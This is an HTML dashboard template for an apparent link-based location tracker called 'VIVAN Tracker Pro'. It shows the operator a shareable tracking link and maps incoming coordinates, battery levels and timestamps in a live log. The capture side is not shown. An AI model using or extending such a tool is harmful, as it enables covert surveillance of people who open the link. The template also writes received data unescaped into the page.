<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VIVAN | Pro Dashboard</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Inter:wght@400;600&display=swap" rel="stylesheet">
    <style>
        :root { --neon-blue: #00d2ff; --neon-green: #39ff14; --bg-dark: #0f172a; }
        body { margin: 0; font-family: 'Inter', sans-serif; background: var(--bg-dark); color: white; height: 100vh; display: flex; flex-direction: column; }
        
        header { background: rgba(30, 41, 59, 0.8); backdrop-filter: blur(10px); padding: 15px 30px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid rgba(0, 210, 255, 0.3); }
        .logo { font-family: 'Orbitron'; color: var(--neon-blue); text-shadow: 0 0 10px var(--neon-blue); }

        .link-bar { background: rgba(0, 210, 255, 0.1); padding: 10px; text-align: center; border-bottom: 1px solid rgba(255,255,255,0.05); }
        code { background: #000; padding: 5px 10px; color: var(--neon-green); border-radius: 4px; }

        .main-layout { display: flex; flex: 1; overflow: hidden; }
        #map { flex: 3; background: #0b0e14; }
        
        .sidebar { flex: 1; background: #1e293b; padding: 20px; border-left: 1px solid rgba(255,255,255,0.1); overflow-y: auto; min-width: 280px; }
        .stat-card { background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.1); padding: 15px; border-radius: 12px; margin-bottom: 15px; }
        .live-item { border-left: 3px solid var(--neon-green); padding: 10px; background: rgba(255,255,255,0.02); margin-top: 10px; font-size: 0.8rem; }
        
        button { background: var(--neon-blue); border: none; padding: 5px 15px; border-radius: 4px; color: #0f172a; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>

<header>
    <div class="logo">VIVAN TRACKER PRO</div>
    <div style="font-size: 0.8rem; color: var(--neon-green)">● Welcome, {{ username }} | <a href="/logout" style="color: white; text-decoration:none;">Logout</a></div>
</header>

<div class="link-bar">
    <span>Your Tracking Link: </span>
    <code id="trackLink">{{ link }}</code>
    <button onclick="copyLink()">COPY</button>
</div>

<div class="main-layout">
    <div id="map"></div>
    <div class="sidebar">
        <div class="stat-card">
            <h4 style="margin:0; color: #94a3b8;">SYSTEM STATUS</h4>
            <p style="color: var(--neon-green); font-family: 'Orbitron'; margin: 10px 0;">ACTIVE ACCESS</p>
        </div>
        <div id="feed">
            <h4 style="color: var(--neon-blue);">LIVE ACTIVITY LOG</h4>
            </div>
    </div>
</div>

<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
<script>
    var map = L.map('map', {zoomControl: false}).setView([26.7606, 83.8914], 10);
    L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png').addTo(map);

    function copyLink() {
        var text = document.getElementById("trackLink").innerText;
        navigator.clipboard.writeText(text);
        alert("Link Copied!");
    }

    function fetchData() {
        fetch('/get_data')
            .then(res => res.json())
            .then(data => {
                const feed = document.getElementById('feed');
                feed.innerHTML = '<h4 style="color: var(--neon-blue);">LIVE ACTIVITY LOG</h4>';
                
                data.forEach((loc, i) => {
                    // Update Map
                    L.circleMarker([loc.latitude, loc.longitude], {
                        radius: i === 0 ? 10 : 6,
                        color: i === 0 ? '#00d2ff' : '#39ff14',
                        fillOpacity: 0.7
                    }).addTo(map);

                    // Update Sidebar Feed
                    feed.innerHTML += `
                        <div class="live-item">
                            <b>Update Received</b><br>
                            Batt: ${loc.battery} | Time: ${loc.timestamp}
                        </div>
                    `;
                });
            });
    }

    setInterval(fetchData, 15000);
    fetchData();
</script>

</body>
</html>
